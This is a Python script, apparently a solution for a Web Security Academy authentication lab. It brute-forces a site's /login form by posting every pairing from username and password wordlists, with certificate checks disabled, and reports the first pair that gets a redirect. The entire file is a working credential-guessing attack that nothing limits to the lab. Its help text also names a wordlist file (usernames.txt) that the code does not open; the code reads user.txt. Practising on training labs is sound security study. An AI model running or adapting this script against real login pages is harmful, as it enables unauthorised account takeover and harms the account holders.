#!/usr/bin/env python3 

from site import USER_SITE
import requests
import urllib3
import argparse
import sys
from argparse import RawTextHelpFormatter

# Disable warnings related to certificates
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

parser = argparse.ArgumentParser(description="""Authentication Web Security Academy

Example usage without proxy: python3 script.py -u "https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net" 

First download auth-lab-usernames and auth-lab-passwords in the same folder as the script and rename them to usernames.txt and passwords.txt respectively
""", usage='use "python3 %(prog)s --help" for more information', formatter_class=RawTextHelpFormatter)
parser.add_argument('-u', '--url', help='URL, Example: https://0a4b003803f44a75c13da5e2009400df.web-security-academy.net', required=True)
args = parser.parse_args()

if args.url.endswith("/"):
    url = args.url[:-1]
else: 
    url = args.url

def user_enum(url):
    with open('user.txt') as f:
        users = f.readlines()
    with open('passwords.txt') as g:
        pwd = g.readlines()
    for i in users:
        for j in pwd:
            data = {
                "username": i.strip('\n'),
                "password": j.strip('\n')
            }
            print("Trying: " + i.strip('\n') + ":" + j.strip('\n'))
            r = requests.post(url + '/login', verify=False, data=data, allow_redirects=False)
            if (r.status_code == 302):
                print("The valid credentials are: " + i.strip('\n') + ":" + j.strip('\n'))
                sys.exit("(+) Username Enumeration Successful!")
            else:
                pass

def main():
    
    print("(+) Exploiting Username Enumeration")
        
    user_enum(url)

if __name__ == "__main__":
    main()
